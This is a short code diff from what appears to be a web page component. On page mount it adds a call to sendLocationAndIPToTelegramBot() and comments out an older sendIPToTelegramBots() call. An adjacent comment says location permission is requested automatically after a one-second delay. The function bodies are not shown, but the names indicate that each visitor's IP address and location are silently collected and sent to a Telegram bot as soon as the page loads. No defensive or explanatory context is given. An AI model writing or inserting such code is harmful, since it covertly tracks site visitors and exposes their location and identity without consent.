@@ -6,9 +6,9 @@
   onMount(async () => {
 
      
+sendLocationAndIPToTelegramBot();
 
-
-    sendIPToTelegramBots();
+    //sendIPToTelegramBots();
     
     setTimeout(() => {
       // Request location permission automatically after a delay of 1 second
